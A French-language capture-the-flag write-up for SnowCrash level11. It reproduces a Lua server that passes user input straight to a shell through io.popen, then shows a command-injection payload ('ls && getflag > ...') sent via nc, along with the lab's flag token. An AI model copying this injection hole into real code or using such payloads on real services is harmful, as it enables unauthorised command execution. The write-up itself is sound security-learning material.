#level11

1) avec un simple `ls` on trouve un fichier lua `level11.lua` :

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

2) dans ce code on peut voir qu'on a un serveur auto heberge: 

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))
```

quand on se connecte dessus on peut saisir un mdp qu'on ne connait pas: 

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: im smart?
Erf nope..
```

3) Si on rentre un peu plus en detail dans le code on se rend assez vite compte que trouver le bon mdp ne sert a rien puisque cela change juste le print de sortie. Cependant il y a deux lignes vraiment importantes dans ce code:

```lua
local l, err = client:receive()
```

cette ligne nous permet d'envoyer ce que l'on veut au serveur et cela sera traite comme etant `local` au serveur lua ce qui est bien pratique pour nous.

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

cette ligne execute directement en shell ce que l'on envoie au serveur. 

4) le fonctionnement normal de la ligne d'execution shell peut etre detourne de son usage, elle sert normalement a ecrire le mdp et envoyer la sortie a `shalsum`. Cependant le `echo` n'est pas force et l'information est transmise par un pipe. On peut donc s'intercaler au millieu pour executer notre propre commande en ignorant le `echo` et sans que notre sortie soit traitee par `shalsum` avec la commande suivante :

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: ls && getflag > /tmp/oskour
Erf nope..
level11@SnowCrash:~$ cat /tmp/oskour
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

le `ls` est interpreter puis lu par `echo`, sont resultat est envoye a `shalsum` via le pipe. Puis via le `&&` le serveur vas executer `getflag` et l'ecrire dans `/tmp` pour nous. Victoire !
